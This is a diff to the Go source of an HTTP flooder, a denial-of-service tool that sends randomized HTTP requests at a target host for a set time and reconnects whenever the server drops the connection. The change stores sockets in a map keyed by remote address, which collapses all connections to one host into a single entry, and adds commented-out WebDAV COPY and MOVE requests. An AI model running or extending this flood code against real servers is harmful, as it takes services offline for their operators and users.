@@ -201,6 +201,9 @@ func GenerateRandomRequests(host string) []string {
 			requests = append(requests, "TRACE "+GenerateRandomEndpoint()+" HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n")
 		case "OPTIONS":
 			requests = append(requests, "OPTIONS "+GenerateRandomEndpoint()+" HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\n\r\n")
+			// WebDAV
+			/*case "COPY": requests = append(requests, "COPY "+GenerateRandomEndpoint()+" HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\nDestination: "+GenerateRandomEndpoint()+"\r\n\r\n")*/
+			/*case "MOVE": requests = append(requests, "MOVE "+GenerateRandomEndpoint()+" HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+GenerateRandomUserAgent()+"\r\nDestination: "+GenerateRandomEndpoint()+"\r\n\r\n")*/
 		}
 	}
 
@@ -209,7 +212,7 @@ func GenerateRandomRequests(host string) []string {
 
 func (flooder *HttpFlooder) Flood() {
 	var secureSuccess int = 0
-	var sockets []net.Conn
+	sockets := make(map[string]net.Conn)
 
 	start := time.Now()
 	for time.Since(start) < time.Duration(flooder.Duration)*time.Second {
@@ -256,7 +259,7 @@ func (flooder *HttpFlooder) Flood() {
 					continue
 				}
 
-				sockets = append(sockets, conn)
+				sockets[conn.RemoteAddr().String()] = conn
 			}
 		}
 
@@ -266,7 +269,11 @@ func (flooder *HttpFlooder) Flood() {
 			return
 		}
 
-		conn := sockets[rand.Intn(len(sockets))]
+		var conn net.Conn
+		for key := range sockets {
+			conn = sockets[key]
+			break
+		}
 
 		requests := GenerateRandomRequests(flooder.Host)
 		for _, request := range requests {
@@ -276,12 +283,7 @@ func (flooder *HttpFlooder) Flood() {
 
 				// assuming that the server forcefully closed our socket
 				conn.Close()
-				for i, c := range sockets {
-					if c == conn {
-						sockets = append(sockets[:i], sockets[i+1:]...)
-						break
-					}
-				}
+				delete(sockets, conn.RemoteAddr().String())
 
 				conn, err = net.Dial("tcp", combineHost(flooder.Host, flooder.Port))
 				if err != nil {
@@ -289,7 +291,7 @@ func (flooder *HttpFlooder) Flood() {
 					break
 				}
 
-				sockets = append(sockets, conn)
+				sockets[conn.RemoteAddr().String()] = conn
 				continue
 			}
 			print_sumthin("Sent: "+strconv.Itoa(n), INFO)
